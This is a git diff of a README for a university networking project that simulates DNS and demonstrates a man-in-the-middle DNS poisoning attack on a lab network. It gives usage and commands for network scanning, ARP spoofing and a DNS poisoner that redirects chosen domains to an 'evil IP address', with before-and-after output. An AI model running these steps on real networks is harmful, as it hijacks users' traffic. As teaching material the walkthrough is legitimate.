@@ -14,7 +14,7 @@ This project is part of a university curriculum which is *Basic Networking Progr
 # Introduction
 This project has 2 main features.  
 1. Simulate DNS protocol  
-2. Illustrate a Man-In-The-Middle attack to spoof DNS reponses from the **Resolver** to the **User**, this is called **DNS Spoofing**.
+2. Demonstrate a Man-In-The-Middle attack to poison DNS reponses from the **Resolver** to the **User**, this is called **DNS poisoning**.
 
 ## Dependencies
 - `scapy` (for python 3.9)
@@ -47,9 +47,10 @@ optional arguments:
                         tcp/udp (udp by default)
 ```
 
-## DNS Spoofing
+## DNS Poisoning
 ### Network Scanner
-To be the man in the middle, we need to know the IP addresses of our 2 targets. For this reason, run the `Network_Scanner.py` script with the `-t` option to specify the IP range of the network that we want to scan. The outcome of this script will be the ***IP addresses*** as well as ***MAC addresses*** of **all hosts** in the targeted network.  
+To be the man in the middle, we need to know the IP addresses of our 2 targets. For this reason, run the `Network_Scanner.py` script with the `-t` option to specify the IP range of the network that we want to scan.  
+The outcome of this script will be the ***IP addresses*** as well as ***MAC addresses*** of **all hosts** in the targeted network.  
 Use the `-h` option to see the help message.
 ```python
 usage: Network_Scanner.py [-h] -t [TARGET]
@@ -72,19 +73,19 @@ optional arguments:
   -g GATEWAY_IP, --gateway GATEWAY_IP
                         the IP address of the default gateway
 ```  
-> Originally, this tool was developed to spoof a host and a default gateway. However, this can be run to spoof 2 arbitrary hosts in the same network. If that is the case, we can use `-t` and `-g` interchangeably to specify our 2 targets.  
+> Originally, this tool was developed to spoof a host and a default gateway. However, this can be run to spoof 2 arbitrary hosts on the same network. If that is the case, we can use `-t` and `-g` interchangeably to specify our 2 targets.  
 
-### DNS Spoofer
-Once we become the man in the middle, we can run `DNS_Spoofer.py` to spoof DNS response from Resolver to User.  
+### DNS Poisoner
+Once we become the man in the middle, we can run `DNS_poisoner.py` to poison DNS response from Resolver to User.  
 For more information, use the `-h` option to see the help message.
 ```python
-usage: DNS Spoofer [-h] -t TARGET DOMAIN [TARGET DOMAIN ...] -d
+usage: DNS poisoner [-h] -t TARGET DOMAIN [TARGET DOMAIN ...] -d
                    [DESTINATION IP ADDRESS] [-l [TRUE]]
 
 optional arguments:
   -h, --help            show this help message and exit
   -t TARGET DOMAIN [TARGET DOMAIN ...], --target-domains TARGET DOMAIN [TARGET DOMAIN ...]
-                        Domain names that we want to spoof
+                        Domain names that we want to poison
   -d [DESTINATION IP ADDRESS], --destined-domain [DESTINATION IP ADDRESS]
                         Our evil IP address that we want the victim to reach
   -l [TRUE], --local [TRUE]
@@ -98,17 +99,27 @@ Then, we'll receive logs as followed:
 [SERVER]         Listening for TCP connections at 10.0.0.5:5353...
 [RESOLVER]       Listening for clients' requests at 10.0.0.5:9292...
 ```  
-We run the `UserScript.py` to make a query for `facebook.com`. Here, we run this script on a machine whose IP address is `10.0.0.7`.
+We run the `UserScript.py` to make a query for `facebook.com`. Here, we run this script on a machine whose IP address is `10.0.0.7`.  
+
 ```bash
 python3 UserScript.py -d facebook.com --ip 10.0.0.5 --port 9292
+```  
+
+The result in return is:  
 ```
-The result in return is `facebook.com.;1;1;205;69.171.250.35`. The last part of the reponse (`69.171.250.35`) is the IP address of `facebook.com`.  
-In addition, if we examine the resolver's log, we can see a message specifying that the resolver has received a request from a user. 
+facebook.com.;1;1;205;69.171.250.35
+```  
+> The last part of the reponse (`69.171.250.35`) is the IP address of `facebook.com`.  
+
+In addition, if we examine the resolver's log, we can see a message specifying that the resolver has received a request from a user.  
+
 ```bash
 [RESOLVER]       Receive a request for facebook.com;A;IN from ('10.0.0.7', 49775) using UDP
 ```
-> If we want to specify the Resolver to make a query to the Nameserver via TCP, we need to execute the script with the `--protocol tcp` option.
-### Now, let's do some hacking.  
+> If we want to specify the Resolver to make a query to the Nameserver via TCP, we need to execute the script with the `--protocol tcp` option.  
+
+
+### Now, let's make our hands dirty 🤡  
 First and foremost, as we already know the IP addresses of the machines that run the `main.py` and `UserScript.py`, it is unnecessary to run the `Network_Scanner.py`.  
 Next, we need to run the `ARP_spoofer.py` to make us become the man in the middle between the Resolver and User.
 ```bash
@@ -122,11 +133,11 @@ If the script is executed successfully, a successful message will be printed on 
 [+] Spoof ['10.0.0.5'] and ['10.0.0.7'] successfully!
 ```
 
-Finally, run our `DNS_spoofer.py`.
+Finally, run our `DNS_poisoner.py`.
 ```bash
-sudo python DNS_spoofer.py -t facebook.com google.com -d 10.0.0.10
+sudo python DNS_poisoner.py -t facebook.com google.com -d 10.0.0.10
 ```
-Here, we specify the domains that we want to spoof. In this example, we will spoof any responses that carry the IP addresses of `facebook.com` and `google.com`.  
+Here, we specify the domains that we want to poison. In this example, we will poison any responses that carry the IP addresses of `facebook.com` and `google.com`.  
 These IP addresses will be changed to the one specified by the `-d` option, which is `10.0.0.10` in this example.  
   
 Now let's come back to the machine that runs `UserScript.py` and make a query for `facebook.com` again.
@@ -134,8 +145,12 @@ Now let's come back to the machine that runs `UserScript.py` and make a query fo
 python3 UserScript.py -d facebook.com --ip 10.0.0.5 --port 9292
 ```
 
-This time, the response is `facebook.com.;1;1;205;10.0.0.10` which carries the spoofed IP address specified by our `DNS_spoofer`.  
-But if we make a query for `youtube.com`, the response is not spoofed (`youtube.com.;1;1;43;172.217.31.238`).  
+This time, the response is:  
+```
+facebook.com.;1;1;205;10.0.0.10
+``` 
+which carries the spoofed IP address specified by our `DNS_poisoner`.  
+But if we make a query for `youtube.com`, the response is not poisoned (`youtube.com.;1;1;43;172.217.31.238`).  
 
 # Contributors
 - [*Dat Thinh*](https://github.com/datthinh1801)  
